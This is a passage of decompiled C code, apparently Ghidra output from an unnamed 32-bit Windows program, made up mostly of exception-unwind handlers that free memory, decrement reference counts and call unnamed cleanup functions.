    FUN_0040c7b0(ppiVar3 + 2,'\x01');
    operator_delete(ppiVar3);
    *(int *)(unaff_EBP + -0x47c) = *(int *)(unaff_EBP + -0x47c) + -1;
    ppiVar3 = ppiVar2;
  }
  operator_delete(*(void **)(unaff_EBP + -0x480));
  *(undefined4 *)(unaff_EBP + -0x480) = 0;
  *(undefined4 *)(unaff_EBP + -0x47c) = 0;
  return;
}

void Unwind_0041427b(void)

{
  char cVar1;
  int iVar2;
  int unaff_EBP;
  
  iVar2 = *(int *)(unaff_EBP + -0x470);
  if (iVar2 != 0) {
    cVar1 = *(char *)(iVar2 + -1);
    if ((cVar1 == '\0') || (cVar1 == -1)) {
      operator_delete((char *)(iVar2 + -1));
    }
    else {
      *(char *)(iVar2 + -1) = cVar1 + -1;
    }
  }
  *(undefined4 *)(unaff_EBP + -0x470) = 0;
  *(undefined4 *)(unaff_EBP + -0x46c) = 0;
  *(undefined4 *)(unaff_EBP + -0x468) = 0;
  return;
}

void Unwind_00414290(void)

{
  int unaff_EBP;
  
  operator_delete(*(void **)(unaff_EBP + -0x268));
  return;
}

void Unwind_004142b0(void)

{
  int unaff_EBP;
  
  FUN_0040dbf0((undefined4 *)(unaff_EBP + -0x240c));
  return;
}

void Unwind_004142d0(void) {
  int unaff_EBP;
  
  FUN_0040dbf0((undefined4 *)(unaff_EBP + -0x240c));
  return;
}

void Unwind_004142f0(void) {
  int unaff_EBP;
  
  FUN_0040dbf0((undefined4 *)(unaff_EBP + -0x240c));
  return;
}

void Unwind_00414320(void) {
  FUN_00401080();
  return;
}

void Unwind_00414340(void) {
  int unaff_EBP;
  
  FUN_0040cf30(*(undefined4 **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00414360(void) {
  int unaff_EBP;
  
  FUN_0040cf30(*(undefined4 **)(unaff_EBP + -0x10));
  return;
}

void Unwind_00414380(void) {
  int unaff_EBP;
  
  operator_delete(*(void **)(unaff_EBP + -0x10));
  return;
}